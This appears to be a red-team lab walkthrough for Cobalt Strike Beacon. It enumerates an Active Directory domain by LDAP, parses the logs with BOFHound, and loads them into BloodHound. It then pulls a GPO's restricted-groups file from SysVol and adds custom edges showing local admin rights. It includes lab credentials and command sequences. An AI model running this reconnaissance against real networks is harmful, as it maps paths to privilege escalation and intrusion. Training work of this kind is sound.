# Kill Chain

### BOFHound <a href="#bofhound" id="bofhound"></a>

1.  Use LDAP to enumerate the domain, users, groups, OUs, and GPOs.

    ```beacon-nocolor
    ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor
    ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
    ```
2. Copy the raw Beacon logs to the Attacker Desktop.
   1. From the Windows Terminal, open a tab for Ubuntu.
   2. cd /mnt/c/Users/Attacker/Desktop
   3.  scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .

       > The password is Passw0rd!.
3. Parse the logs with BOFHound
   1. bofhound -i logs

### BloodHound <a href="#bloodhound" id="bloodhound"></a>

1. Run BloodHound.
   1. From the Start Menu, open Docker Desktop.
   2. Click the **Containers** link on the left-hand side.
   3. Start all the containers by clicking the 'play' button, and wait for them to start.
   4. From the taskbar, open Microsoft Edge.
   5. Click the BloodHound shortcut in the favourites bar, or manually browse to http://localhost:8080/ui/login
   6. The browser should autofil the credentials. If not, use admin : eA%N4frBrnn2.
2. Ingest the BOFHound data.
   1. After first login, click the 'start by uploading your data' link.
   2.  On the new page, click the 'Upload File(s)' button and select the JSON files produced by BOFHound.

       > They will be in _C:\Users\Attacker\Desktop\\_.
   3. Wait until the status reaches 'Complete'.
3. Click the **Explore** link in the left-hand menu.
4. Select the Cypher query search box.
5. Using the following cypher query, search for GPOs in BloodHound:
   1. Match (n:GPO) return n
   2. Click **Run**.
6. Select the 'Workstation Admins' GPO.
   1. Take note of its Gpcpath.
   2. Expand its 'Affected Objects' and select 'Computers'.
7. Select each computer and note their Obiect ID.

### Restricted Groups Data <a href="#restricted-groups-data" id="restricted-groups-data"></a>

1.  Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.

    ```beacon-nocolor
    ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
    download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```
2.  Sync the file to your Attacker Desktop.

    > View > Downloads.
3. Open the file in Notepad (or VSCode).
   1. Note the SID of the domain group.
4.  Add the custom edges in BloodHound.

    ```cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

    ```cypher
    CypherTypeCopyMATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.

